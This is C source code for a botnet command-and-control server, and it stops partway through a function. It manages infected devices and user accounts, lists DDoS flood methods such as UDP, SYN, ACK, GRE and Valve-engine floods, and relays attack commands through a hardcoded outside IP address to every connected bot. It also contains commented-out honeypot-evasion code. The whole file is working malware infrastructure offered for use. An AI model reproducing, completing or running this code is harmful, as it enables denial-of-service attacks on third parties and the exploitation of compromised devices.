#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <glob.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/epoll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/sysctl.h>

#define LOG_FORMAT      "(%s, %d, %s, %s, %s, %d, %s),\n"
#define USER_FORMAT     "\x1b[1;37m(\x1b[97m%s\x1b[1;37m, \x1b[97m%s\x1b[1;37m, \x1b[97m%s\x1b[1;37m, \x1b[97m%s\x1b[1;37m, \x1b[97m%s\x1b[1;37m),\n"
#define MAXFDS          1000000
#define EPOLL_TIMEOUT   -1
#define MAXCONCURRENT   1
#define MAXUSERS        30

#define USER_COMMANDS   15
#define ADMIN_COMMANDS  6

static volatile int epoll_fd = 0, attack_id = 0, listen_fd = 0, scanning = 1, attacking = 1, operatorCount = 0, last_attack = 0;
static uint32_t x, y, z, w;

struct clientdata_t
{
    uint32_t ip;
    int fd, arch_len, scanning;
    char connected, arch[32];
} clients[MAXFDS];

struct accountinfo_t
{
    char username[100], password[100], floods[128], lastcmd[512], lastflood[256], *rdbuf; //128
    int fd, admin, maxbots;
    int attacktime, concurrents, running, time_logged, can_attack, connected, lastcmd_time;
    int ongoing_times[MAXCONCURRENT];
    int slotavail;
};
static struct accountinfo_t accinfo[MAXFDS];


#define MAX_ATTACKS 3

struct attack
{
  unsigned int attacknum;  
  unsigned char buf[256];
  unsigned char user_sent[100];
  unsigned int fd;
  int time_left;
};

struct attack attacks[MAX_ATTACKS];

int canprint = 0;
int globavail;
/*
struct ongoingatt_t 
{
    struct attackdetail_t attackdetails;
    int running_attacks[MAXCONCURRENT]; // list of times until attacks are over
    int attack_owners[100];  // list of fds of which attacks were executed under
    int attackdetails[100]; // pointers to all attackdetails_t
};
*/
char *user_commands[USER_COMMANDS][2] = {
    {"Attack Format ->", "!(METHOD) ip time dport="},
    {"udpflood", "Generic UDP Flood"},
    {"plainflood", "Plain UDP Flood"},
    {"vseflood", "Valve Source Engine UDP Flood"},
    {"hexflood", "STD-HEX UDP Flood"},
    {"synflood", "TCP Flood With SYN Packets"},
    {"wraflood", "TCP WRA Flood"},
    {"ackflood", "TCP Flood With ACK Packets"},
    {"greip", "GREIP Flood"},
    {"greeth", "GREETH Flood"},
    {"syndataflood", "TCP Flood Sending SYN Packets With Data"},
    {"icmpflood", "ICMP Echo Flood"},
    {"tcpbypass", "TCP SYN Flood With Multiple TCP Options"},
    {"exit", "Logout Of The CNC"},
    {"clear", "Clears Your Screen"},
};

char *admin_commands[ADMIN_COMMANDS][2] = {
    {"\r\nattacks <enable/disable>", "enable or disable the use of ongoing attacks"},
    {"bots", "View Bots (ADMIN ONLY!)"},
    {"users", "List User Info From User Database"},
    {"updateproc", "Update Binaries"},
    {"viewfloods", "View Current Running Floods"},
    {"online", "View Current Connected Users"},
};


int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int total = 0, got = 1;

    while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n')
    {
        got = read(fd, buffer + total, 1);
        total++;
    }

    return got;
}

void trim(char *str)
{
    int i, begin = 0, end = strlen(str) - 1;

    while (isspace(str[begin]))
        begin++;

    while ((end >= begin) && isspace(str[end]))
        end--;

    for (i = begin; i <= end; i++)
        str[i - begin] = str[i];

    str[i - begin] = '\0';
}

int fd_set_blocking(int fd, int blocking)
{
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags == -1)
        return 0;

    if (blocking)
        flags &= ~O_NONBLOCK;
    else
        flags |= O_NONBLOCK;

    return fcntl(fd, F_SETFL, flags) != -1;
}

int split(const char *txt, char delim, char ***tokens)
{
    int *tklen, *t, count = 1;
    char **arr, *p = (char *) txt;

    while (*p != '\0')
        if (*p++ == delim)
            count += 1;

    t = tklen = calloc (count, sizeof (int));
    for (p = (char *) txt; *p != '\0'; p++)
        *p == delim ? *t++ : (*t)++;

    *tokens = arr = malloc (count * sizeof (char *));
    t = tklen;
    p = *arr++ = calloc (*(t++) + 1, sizeof (char *));
    while (*txt != '\0')
    {
        if (*txt == delim)
        {
            p = *arr++ = calloc (*(t++) + 1, sizeof (char *));
            txt++;
        }
        else
            *p++ = *txt++;
    }

    free(tklen);
    return count;
}

char *read_line(int fd, char *buffer, int buffer_size)
{
    int p = 0, x = 0;

    memset(buffer, 0, buffer_size);
    while(1)
    {
        x = read(fd, buffer + p, 1);
        if (x < 0)
            break;
        if (buffer[p] == '\r' || buffer[p] == '\n')
            break;
        p++;
    }

    if (!x)
        return NULL;

    return buffer;
}

void clearnup_connection(struct clientdata_t *conn)
{
    if (conn->fd >= 1)
    {
        close(conn->fd);
        conn->fd = 0;
    }

    conn->connected = 0;
    conn->arch_len = 0;
    conn->scanning = 0;
    memset(conn->arch, 0, sizeof(conn->arch));
}

void terminate(void)
{
    int i;
    for (i = 0; i < MAXFDS; i++)
        clearnup_connection(&clients[i]);

    perror(NULL);
}

int broadcast_command(char *sendbuf, int maxcount, int maxtime, int myfd, char *floods, char *user, int admin_mode)
{
    if (attacking == 0)
    {
        write(myfd, "\x1b[1;37mThe Admins Have Disabled Attacks!\r\n", strlen("\x1b[1;37mThe Admins Have Disabled Attacks!\r\n"));
        return 0;
    }

    int currentrunning = 0;
    int i, f;

    for(i = 0; i < MAXFDS; i++)
    {
        if(accinfo[i].connected > 0)
        {
            for(f = 0; f < accinfo[i].concurrents; f++)
            {
                if(accinfo[i].ongoing_times[f] > 0)
                {
                    currentrunning++;
                }
            }
        }
    }

    if (currentrunning == MAX_ATTACKS)
    {
        char fbuf[128];
        sprintf(fbuf, "Maximum Global Attacks Running On CNC, Please Wait About 1-2 Minutes Then Try Again...\n");
        write(myfd, fbuf, strlen(fbuf));
        memset(fbuf, 0, sizeof(fbuf));
        return 0;
    }

    char tmpbuf[1024], snbuf[1024];
    strcpy(tmpbuf, sendbuf);

    int args_len, g_time, maxcnt = 0;
    char **arguments;

    if ((args_len = split(tmpbuf, ' ', &arguments)) <= 2)
    {
        for (i = 0; i < args_len; i++)
            free(arguments[i]);

        free(arguments);
        memset(tmpbuf, 0, sizeof(tmpbuf));
        write(myfd, "\x1b[1;37mYour Command Is Incorrectly Formatted (!method ip time [options])\r\n", strlen("\x1b[1;37mYour Command Is Incorrectly Formatted (!method ip time [options])\r\n"));
        return 0;
    }

    if (arguments[0][0] == '-')
    {
        int newmax = atoi(arguments[0] + 1);

        if ((newmax > maxcount || newmax < 1) && maxcount != -1)
        {
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            free(arguments);
            memset(tmpbuf, 0, sizeof(tmpbuf));
            write(myfd, "\x1b[1;37mYou Can Not Use More Bots Than You Have Access To!\r\n", strlen("\x1b[1;37mYou Can Not Use More Bots Than You Have Access To!\r\n"));
            return 0;
        }

        maxcnt = 1;
        maxcount = newmax;
        strcpy(snbuf, sendbuf + strlen(arguments[0]) + 1);
    }

    if (arguments[0 + maxcnt])
    {
        int args2_len, i, atk_found = 0;
        char **arguments2;

        if ((args2_len = split(floods, ',', &arguments2)) <= 0)
        {
            for (i = 0; i < args2_len; i++)
                free(arguments2[i]);

            free(arguments2);
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[1;37mUnknown Error, Please Contact The Owner Of The Service.\r\n", strlen("\x1b[1;37mUnknown Error, Please Contact The Owner Of The Service.\r\n"));
            return 0;
        }

        if (args2_len == 1 && strcmp(arguments2[0], "all") == 0)
        {
            atk_found = 1;
            goto skip;
        }

        if (args2_len == 1 && strcmp(arguments2[0], "none") == 0)
        {
            atk_found = 0;
            goto skip;
        }

        for (i = 0; i < args2_len; i++)
        {
            int x;

            if (atk_found == 1)
                break;

            for (x = 0; x < USER_COMMANDS; x++)
            {
                if (strcmp(user_commands[x][0], arguments2[i]) == 0 && strcmp(arguments[0 + maxcnt], arguments2[i]) == 0)
                {
                    atk_found = 1;
                    break;
                }
            }
        }

        skip:
        if (atk_found == 0)
        {
            for (i = 0; i < args2_len; i++)
                free(arguments2[i]);

            free(arguments2);
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[1;37mYou Are Trying To Use A Method That Doesn't Exist!\r\n", strlen("\x1b[1;37mYou Are Trying To Use A Method That Doesn't Exist!\r\n"));
            return 0;
        }

        for (i = 0; i < args2_len; i++)
            free(arguments2[i]);

        free(arguments2);
    }

    if (arguments[2 + maxcnt])
    {
        int atk_time = atoi(arguments[2 + maxcnt]);
        g_time = atk_time;
        if (atk_time > maxtime || atk_time > 300)
        {
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[1;37mYou Are Trying To Send Over Your Current Attack Time Limit!\r\n", strlen("\x1b[1;37mYou Are Trying To Send Over Your Current Attack Time Limit!\r\n"));
            return 0;
        }
    }

    memset(tmpbuf, 0, sizeof(tmpbuf));

    int n = 0, sentto = 0, fd = 0, err = 0;
    char rdbuf[1024];
    uint16_t len;
    struct sockaddr_in sockaddr = {0};

    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
        return 0;

    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port = htons(32105);
    sockaddr.sin_addr.s_addr = inet_addr("185.225.75.222");

    if (connect(fd, (struct sockaddr *)&sockaddr, sizeof (struct sockaddr_in)) == -1)
    {
        close(fd);
        write(myfd, "\x1b[1;37mFailed To Attack, Listener May Not Be screened...\r\n", strlen("\x1b[1;37mFailed To Attack, Listener May Not Be screened...\r\n"));
        return 0;
    }

    if (maxcnt == 1)
        send(fd, snbuf, strlen(snbuf), 0);
    else
        send(fd, sendbuf, strlen(sendbuf), 0);
    send(fd, "\n", 1, 0);

    n = recv(fd, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
    if (n == -1)
    {
        close(fd);
        write(myfd, "\x1b[1;37mThe API Has Failed To Receive Your Command... Contact The Owner Of The Service On Telegram\r\n", strlen("\x1b[1;37mThe API Has Failed To Receive Your Command... Contact The Owner Of The Service On Telegram\r\n"));
        return 0;
    }

    if (len == 0)
    {
        close(fd);
        write(myfd, "\x1b[1;37mThe API Has Failed To Receive Your Command... Contact The Owner Of The Service On Telegram\r\n", strlen("\x1b[1;37mThe API Has Failed To Receive Your Command... Contact The Owner Of The Service On Telegram\r\n"));
        return 0;
    }

    len = ntohs(len);
    if (len > sizeof (rdbuf))
    {
        close(fd);
        write(myfd, "\x1b[1;37mThe API Has Failed To Receive Your Command... Contact The Owner Of The Service On Telegram\r\n", strlen("\x1b[1;37mThe API Has Failed To Receive Your Command... Contact The Owner Of The Service On Telegram\r\n"));
        return 0;
    }

    n = recv(fd, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
    if (n == -1)
    {
        close(fd);
        write(myfd, "\x1b[1;37mThe API Has Failed To Receive Your Command... Contact The Owner Of The Service On Telegram\r\n", strlen("\x1b[1;37mThe API Has Failed To Receive Your Command... Contact The Owner Of The Service On Telegram\r\n"));
        return 0;
    }

    recv(fd, &len, sizeof (len), MSG_NOSIGNAL);
    len = ntohs(len);
    recv(fd, rdbuf, len, MSG_NOSIGNAL);

    for (i = 0; i < MAXFDS; i++)
    {
        if (clients[i].connected == 1 && (maxcount == -1 || sentto < maxcount))
        {
            send(clients[i].fd, rdbuf, len, MSG_NOSIGNAL);
            sentto++;
        }
    }

    char prompt[512];
    if (sentto == 410)
    {
        sprintf(prompt, "\x1b[1;37mDevice Count Is Depleted, We Cannot Start An Attack...\r\n");
        for (i = 0; i < args_len; i++)
            free(arguments[i]);

        free(arguments);
        write(myfd, prompt, strlen(prompt));
        memset(prompt, 0,  sizeof(prompt));
        return 0;
    }
    else
    {
        time_t current_time;
        struct tm *local_time;
        current_time = time(NULL);
        local_time = localtime(&current_time);
        char ts[128];
        strcpy(ts, asctime(local_time));
        trim(ts); ts[strcspn(ts, "\n")] = 0;
        sprintf(prompt, "\x1b[1;37mCommand Sent To \x1b[34m%d \x1b[1;37mDevices (Started At %s)\r\n", sentto, ts);
        //sprintf(prompt, "\x1b[32mAttack sent!\r\n");
    }

    FILE *log_file;
    char log_buf[256];
    time_t current_time;
    struct tm *local_time;
    current_time = time(NULL);
    local_time = localtime(&current_time);
    char ts[128];
    strcpy(ts, asctime(local_time));
    trim(ts); ts[strcspn(ts, "\n")] = 0;
    snprintf(log_buf, sizeof(log_buf), LOG_FORMAT, ts, attack_id, user, arguments[0], arguments[1], maxcount, arguments[2]);

    if ((log_file = fopen("logs.txt", "a")) == NULL)
    {
        for (i = 0; i < args_len; i++)
            free(arguments[i]);

        free(arguments);
        write(myfd, prompt, strlen(prompt));
        memset(prompt, 0,  sizeof(prompt));
        return 1;
    }

    fputs(log_buf, log_file);
    fclose(log_file);
    attack_id++;

    for (i = 0; i < args_len; i++)
        free(arguments[i]);

    free(arguments);
    write(myfd, prompt, strlen(prompt));
    memset(prompt, 0,  sizeof(prompt));
    return g_time;
}

void *ping_pong(void *arg)
{
    int i = 0;

    while(1)
    {
        for (i = 0; i < MAXFDS; i++)
        {
            if (clients[i].connected == 1 && clients[i].fd >= 1)
                send(clients[i].fd, "\x33\x66\x99", 3, MSG_NOSIGNAL);
        }

        sleep(20);
    }
}

/*
void scanner_enable(void)
{
    int i = 0;

    for (i = 0; i < MAXFDS; i++)
    {
        if (clients[i].connected == 1 && clients[i].scanning == 0 && clients[i].fd >= 1)
        {
            clients[i].scanning = 1;
            send(clients[i].fd, "\x66\x33\x99", 3, MSG_NOSIGNAL);
        }
    }
}

void scanner_disable(void)
{
    int i = 0;

    for (i = 0; i < MAXFDS; i++)
    {
        if (clients[i].connected == 1 && clients[i].scanning == 1 && clients[i].fd >= 1)
        {
            clients[i].scanning = 0;
            send(clients[i].fd, "\x33\x99\x66", 3, MSG_NOSIGNAL);
        }
    }
}
*/

void update_binaries(void)
{
    int i = 0;

    for (i = 0; i < MAXFDS; i++)
    {
        if (clients[i].connected == 1 && clients[i].scanning == 1 && clients[i].fd >= 1)
        {
            clients[i].scanning = 0;
            send(clients[i].fd, "\x33\x99\x66", 3, MSG_NOSIGNAL);
        }
    }
}

void sendbanner(int myfd)
{
    char line1[63];
    sprintf(line1, "\033[2J\033[1;1H\033[1;37mWelcome To \x1b[34mボットネット\033[1;37m!\r\n");
    send(myfd, line1, strlen(line1), MSG_NOSIGNAL);

    return;
}

void *tab_title_admin(void *arg)
{
    int botcount = 0, usercount = 0, attkcount = 0, i, f;
    char title[128];
    int myfd = *((int *)arg);

    while (1)
    {
        for (i = 0; i < MAXFDS; i++)
        {
            if (clients[i].connected == 1)
                botcount++;
            else
                continue;
        }

        for (i = 0; i < MAXFDS; i++)
        {
            if (accinfo[i].connected == 1)
                usercount++;
            else
                continue;
        }

    for(i = 0; i < MAXFDS; i++)
    {
        if(accinfo[i].connected > 0)
        {
            for(f = 0; f < accinfo[i].concurrents; f++)
            {
                if(accinfo[i].ongoing_times[f] > time(NULL))
                {
                    attkcount++;
                }
            }
        }
    }


        sprintf(title, "\033]0;Devices: %d | ~ | %d/%d Running Attacks | ~ | https://t.me/tcpfed\007", botcount, attkcount, MAX_ATTACKS);

        if (send(myfd, title, strlen(title), MSG_NOSIGNAL) <= 0)
        {
            memset(title, 0, sizeof(title));
            break;
        }

        botcount = 0;
        attkcount = 0;
        usercount = 0;
        memset(title, 0, sizeof(title));
        sleep(2);
    }
    pthread_exit(0);
}

void *tab_title_user(void *arg)
{
    int botcount = 0, attkcount = 0, i, f;
    char title[128];
    int myfd = *((int *)arg);

    while (1)
    {
        for (i = 0; i < MAXFDS; i++)
        {
            if (clients[i].connected == 1)
                botcount++;
            else
                continue;
        }
        int i, f;

    for(i = 0; i < MAXFDS; i++)
    {
        if(accinfo[i].connected == 1)
        {
            for(f = 0; f < accinfo[i].concurrents; f++)
            {
                if(accinfo[i].ongoing_times[f] > time(NULL))
                {
                    attkcount++;
                }
            }
        }
    }

        sprintf(title, "\033]0;Devices: %d | ~ | %d/%d Running Attacks | ~ | https://t.me/tcpfed\007", botcount, attkcount, MAX_ATTACKS);

        if (send(myfd, title, strlen(title), MSG_NOSIGNAL) <= 0)
        {
            memset(title, 0, sizeof(title));
            break;
        }

        botcount = 0;
        attkcount = 0;
        memset(title, 0, sizeof(title));
        sleep(2);
    }
    pthread_exit(0);
}

int create_and_bind(char *port)
{
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;

    memset(&hints, 0, sizeof (struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);

    if (s != 0)
        return -1;

    for (rp = result; rp != NULL; rp = rp->ai_next)
    {
        sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1)
            continue;

        int yes = 1;
        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
        {
            terminate();
        }

        s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0)
            break;

        close(sfd);
    }

    if (rp == NULL)
        return -1;
    else
    {
        freeaddrinfo(result);
        return sfd;
    }
}

void loghp(char *ip)
{
    FILE *logFile;
    logFile = fopen("honeypots.txt", "a");
    fprintf(logFile, "%s\n", ip);
    fclose(logFile);
}

/*
int hpcheck(char *ip)
{
    char rdbuf[1024];
    int file_fd;

    if ((file_fd = open("honeypots.txt", O_RDONLY)) == -1)
    {
        printf("\x1b[1;37mFailed to open honeypots.txt\r\n");
        return 1;
    }

    while (memset(rdbuf, 0, sizeof(rdbuf)) && read_line(file_fd, rdbuf, sizeof(rdbuf)) != NULL)
    {
        if (rdbuf[0] == '\r' || rdbuf[0] == '\n')
            break;

        if(strstr(rdbuf, ip))
        {
            return 0;
        }
    }
    fclose(file_fd);
    return 1;
}
*/

void *bot_event(void *arg)
{
    struct epoll_event event;
    struct epoll_event *events;

    events = calloc(MAXFDS, sizeof event);

    while (1)
    {
        int n, i;
        n = epoll_wait(epoll_fd, events, MAXFDS, EPOLL_TIMEOUT);

        for (i = 0; i < n; i++)
        {
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
            {
                printf("[ботнет] Client \x1b[31mTerminated\x1b[37m %d.%d.%d.%d (bot id %s)\n", clients[event.data.fd].ip & 0xff, (clients[event.data.fd].ip >> 8) & 0xff, (clients[event.data.fd].ip >> 16) & 0xff, (clients[event.data.fd].ip >> 24) & 0xff, clients[event.data.fd].arch);
                clearnup_connection(&clients[events[i].data.fd]);
                continue;
            }
            else if (listen_fd == events[i].data.fd)
            {
                while (1)
                {
                    int accept_fd, s, ipIndex;
                    struct sockaddr in_addr;
                    socklen_t in_len = sizeof(in_addr);

                    if ((accept_fd = accept(listen_fd, &in_addr, &in_len)) == -1)
                    {
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK))
                            break;
                        else
                        {
                            //printf("[cnc] Client Disconnected due to bad Recv %d.%d.%d.%d (bot id %s)\n", clients[event.data.fd].ip & 0xff, (clients[event.data.fd].ip >> 8) & 0xff, (clients[event.data.fd].ip >> 16) & 0xff, (clients[event.data.fd].ip >> 24) & 0xff, clients[event.data.fd].arch);
                            terminate();
                        }
                    }

                    if ((s = fd_set_blocking(accept_fd, 0)) == -1)
                    {
                        close(accept_fd);
                        break;
                    }

                    event.data.fd = accept_fd;
                    event.events =  EPOLLIN | EPOLLET;

                    if ((s = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, accept_fd, &event)) == -1)
                    {
                        terminate();
                        break;
                    }

                    clients[event.data.fd].fd = event.data.fd;
                    clients[event.data.fd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                    for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) // check for duplicate clients by seeing if any have the same IP as the one connecting
                    {
                        if(!clients[ipIndex].connected || ipIndex == event.data.fd) 
                            continue;

                        if(clients[ipIndex].ip == clients[event.data.fd].ip)
                        {
                            printf("[ботнет] Duplicate \x1b[31mDeleted \x1b[37m%d.%d.%d.%d (bot id %s)\n", clients[event.data.fd].ip & 0xff, (clients[event.data.fd].ip >> 8) & 0xff, (clients[event.data.fd].ip >> 16) & 0xff, (clients[event.data.fd].ip >> 24) & 0xff, clients[event.data.fd].arch);
                            close(event.data.fd);
                            /*if(strcmp(clients[event.data.fd].arch, " "))
                            {
                                printf("[cnc] \x1b[31mHoneypoop Located\x1b[37m %d.%d.%d.%d (bot id %s)\n", clients[ipIndex].ip & 0xff, (clients[ipIndex].ip >> 8) & 0xff, (clients[ipIndex].ip >> 16) & 0xff, (clients[ipIndex].ip >> 24) & 0xff, clients[ipIndex].arch);
                                char honey_ip[128];
                                sprintf(honey_ip, "iptables -A INPUT -s %d.%d.%d.%d -j DROP", clients[ipIndex].ip & 0xff, (clients[ipIndex].ip >> 8) & 0xff, (clients[ipIndex].ip >> 16) & 0xff, (clients[ipIndex].ip >> 24) & 0xff);
                                //system(honey_ip);
                                close(clients[ipIndex].fd);
                                clearnup_connection(&clients[events[ipIndex].data.fd]);
                            }*/
                            break;
                        }
                    }
                    //clients[event.data.fd].connected = 1;
                    //clients[event.data.fd].scanning = 0;
                    //printf("[cnc] Client Accepted %d.%d.%d.%d (bot id %d)\n", clients[event.data.fd].ip & 0xff, (clients[event.data.fd].ip >> 8) & 0xff, (clients[event.data.fd].ip >> 16) & 0xff, (clients[event.data.fd].ip >> 24) & 0xff, event.data.fd);
                    send(clients[event.data.fd].fd, "\x33\x66\x99", 3, MSG_NOSIGNAL);
                }
                continue;
            }
            else
            {
                int end = 0, fd = events[i].data.fd;

                while (1)
                {
                    char buf[32];
                    int count;

                    while ((count = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL)) > 0)
                    {
                        char *buf_ptr = buf;

                        if (*buf_ptr++ == '\x33' &&  *buf_ptr++ == '\x66' && *buf_ptr++ == '\x99')
                        {
                            char lel;
                            int res;
                            clients[events[i].data.fd].arch_len = *(uint8_t *)buf_ptr;
                            buf_ptr += sizeof(uint8_t);
                            memcpy(clients[events[i].data.fd].arch, buf_ptr, clients[events[i].data.fd].arch_len);
                            lel = clients[events[i].data.fd].arch[0];
                            res = isalnum(lel);
                            if(res == 0)
                            {
                                printf("[cnc] Client \x1b[31mDeclined\x1b[37m (no bot id) %d.%d.%d.%d\n", clients[events[i].data.fd].ip & 0xff, (clients[events[i].data.fd].ip >> 8) & 0xff, (clients[events[i].data.fd].ip >> 16) & 0xff, (clients[events[i].data.fd].ip >> 24) & 0xff);
                                clearnup_connection(&clients[events[i].data.fd]);
                                break;
                            }
                            /*
                            char check_ip[16];
                            sprintf(check_ip, "%d.%d.%d.%d\n", clients[events[i].data.fd].ip & 0xff, (clients[events[i].data.fd].ip >> 8) & 0xff, (clients[events[i].data.fd].ip >> 16) & 0xff, (clients[events[i].data.fd].ip >> 24) & 0xff);
                            if(hpcheck(check_ip) == 0)
                            {
                                printf("[cnc] Honeypot \x1b[31mDeclined\x1b[37m (Blacklist) %d.%d.%d.%d\n", clients[events[i].data.fd].ip & 0xff, (clients[events[i].data.fd].ip >> 8) & 0xff, (clients[events[i].data.fd].ip >> 16) & 0xff, (clients[events[i].data.fd].ip >> 24) & 0xff);
                                close(clients[events[i].data.fd].fd);
                                clearnup_connection(&clients[events[i].data.fd]);
                                break;
                            }
                            */
                            clients[events[i].data.fd].connected = 1;
                            printf("[ботнет] Client \x1b[32mAccepted\x1b[37m %d.%d.%d.%d (bot id %s)\n", clients[events[i].data.fd].ip & 0xff, (clients[events[i].data.fd].ip >> 8) & 0xff, (clients[events[i].data.fd].ip >> 16) & 0xff, (clients[events[i].data.fd].ip >> 24) & 0xff, clients[events[i].data.fd].arch);
                        }
                    }

                    memset(buf, 0, sizeof(buf));

                    if (count == -1)
                    {
                        if (errno != EAGAIN)
                            clearnup_connection(&clients[events[i].data.fd]);

                        break;
                    }
                    else if (count == 0)
                    {
                        clearnup_connection(&clients[events[i].data.fd]);
                        break;
                    }
                }
            }
        }
    }
}

void userlist(int myfd)
{
    char rdbuf[1024];
    int file_fd;

    if ((file_fd = open("logins.txt", O_RDONLY)) == -1)
    {
        write(myfd, "\x1b[1;37mFailed to open logins.txt\r\n", strlen("\x1b[1;37mFailed to open logins.txt\r\n"));
        return;
    }

    while (memset(rdbuf, 0, sizeof(rdbuf)) && read_line(file_fd, rdbuf, sizeof(rdbuf)) != NULL)
    {
        int args_len, i;
        char **arguments;

        if (rdbuf[0] == '\r' || rdbuf[0] == '\n')
            break;

        if ((args_len = split(rdbuf, ' ', &arguments)) != 7)
        {
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            free(arguments);
            continue;
        }

        char send_buf[256];
        snprintf(send_buf, sizeof(send_buf), USER_FORMAT, arguments[0], arguments[2], arguments[3], arguments[4], arguments[5]);
        write(myfd, send_buf, strlen(send_buf));
        memset(send_buf, 0, sizeof(send_buf));

        for (i = 0; i < args_len; i++)
            free(arguments[i]);

        free(arguments);
    }
}

int verify_user(int myfd, char *usr, char *pass)
{
    char rdbuf[1024];
    int file_fd;

    if ((file_fd = open("logins.txt", O_RDONLY)) == -1)
    {
        write(myfd, "\x1b[1;37mFailed to open logins.txt\r\n", strlen("\x1b[1;37mFailed to open logins.txt\r\n"));
        return 1;
    }

    while (memset(rdbuf, 0, sizeof(rdbuf)) && read_line(file_fd, rdbuf, sizeof(rdbuf)) != NULL)
    {
        int args_len, i;
        char **arguments;

        if (rdbuf[0] == '\r' || rdbuf[0] == '\n')
            break;

        if ((args_len = split(rdbuf, ' ', &arguments)) != 7)
        {
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            free(arguments);
            continue;
        }
        if(strcmp(arguments[0], usr) == 0 && strcmp(arguments[1], pass) == 0)
        {
            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            free(arguments);
            return 0;
        }

        for (i = 0; i < args_len; i++)
            free(arguments[i]);

        free(arguments);
    }
    return 1;
}

void botcount(int myfd, int dofind, char *findstr)
{
    struct bot_entry_t {
        int count;
        char arch[500];
    } bot_entry[300];

    int i = 0, q = 0, x = 0, first = 1;

    for (i = 0; i < 300; i++)
    {
        bot_entry[i].count = 0;
        memset(bot_entry[i].arch, 0, sizeof(bot_entry[i].arch));
    }

    for (i = 0; i < MAXFDS; i++)
    {
        if (clients[i].arch_len >= 1 && clients[i].connected == 1)
        {
            if (first == 1)
            {
                strcpy(bot_entry[q].arch, clients[i].arch);
                bot_entry[q].count++;
                first = 0;
                q++;
                continue;
            }
            else
            {
                int found = 0;

                for (x = 0; x < q; x++)
                {
                    if (strcmp(bot_entry[x].arch, clients[i].arch) == 0)
                    {
                        found = 1;
                        bot_entry[x].count++;
                        break;
                    }
                }

                if (found == 0)
                {
                    strcpy(bot_entry[q].arch, clients[i].arch);
                    bot_entry[q].count++;
                    q++;
                    continue;
                }
            }
        }
    }

    for (i = 0; i < q; i++)
    {
        char sndbuf[1024];
        if (dofind == 1)
        {
            if (strstr(bot_entry[i].arch, findstr) != NULL)
            {
                sprintf(sndbuf, "\x1b[34m%s\x1b[97m: \x1b[90m%d\r\n", bot_entry[i].arch, bot_entry[i].count);
                write(myfd, sndbuf, strlen(sndbuf));
                memset(sndbuf, 0, sizeof(sndbuf));
            }
        }
        else if (dofind == 2)
        {
            if (strcmp(bot_entry[i].arch, findstr) == 0)
            {
                sprintf(sndbuf, "\x1b[34m%s\x1b[97m: \x1b[90m%d\r\n", bot_entry[i].arch, bot_entry[i].count);
                write(myfd, sndbuf, strlen(sndbuf));
                memset(sndbuf, 0, sizeof(sndbuf));
            }
        }
        else
        {
            if (strcmp(bot_entry[i].arch, "h") == 0)
            {
                sprintf(sndbuf, "\x1b[34munknown\x1b[97m: \x1b[90m%d\r\n", bot_entry[i].count);
                write(myfd, sndbuf, strlen(sndbuf));
                memset(sndbuf, 0, sizeof(sndbuf));
            }
            else
            {
                sprintf(sndbuf, "\x1b[34m%s\x1b[97m: \x1b[90m%d\r\n", bot_entry[i].arch, bot_entry[i].count);
                write(myfd, sndbuf, strlen(sndbuf));
                memset(sndbuf, 0, sizeof(sndbuf));
            }
        }
    }
    memset(bot_entry, 0, sizeof(bot_entry));
}


void get_captcha(char *s, const int len)
{
    static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    int i = 0;
    for (i = 0; i < len; i++)
        s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

    s[len] = 0;
}

void printattacks(int the_fd)
{
    char abuf[512];
    sprintf(abuf, "     -- Attacks Globally Running --\n");
    write(the_fd, abuf, strlen(abuf));
    memset(abuf, 0, sizeof(abuf));
    int i, f;
    for(i = 0; i < MAXFDS; i++)
    {
        if(accinfo[i].connected == 1)
        {
            for(f = 0; f < accinfo[i].concurrents; f++)
            {
                if(accinfo[i].ongoing_times[f] > time(NULL))
                {
                    char fbuf[512];
                    sprintf(fbuf, "Attack Sent By: %s - Time Left: %ld - Buffer: [%s]\n", accinfo[i].username, accinfo[i].ongoing_times[f] - time(NULL), accinfo[i].lastflood);
                    write(the_fd, fbuf, strlen(fbuf));
                    memset(fbuf, 0, sizeof(fbuf));
                }
            }
        }
    }
}

void *detect_afk(void *arg)
{
    int the_fd = *((int *)arg);
    while(1)
    {
        if(time(NULL) - accinfo[the_fd].lastcmd_time > 3600)
        {
            char fbuf[512];
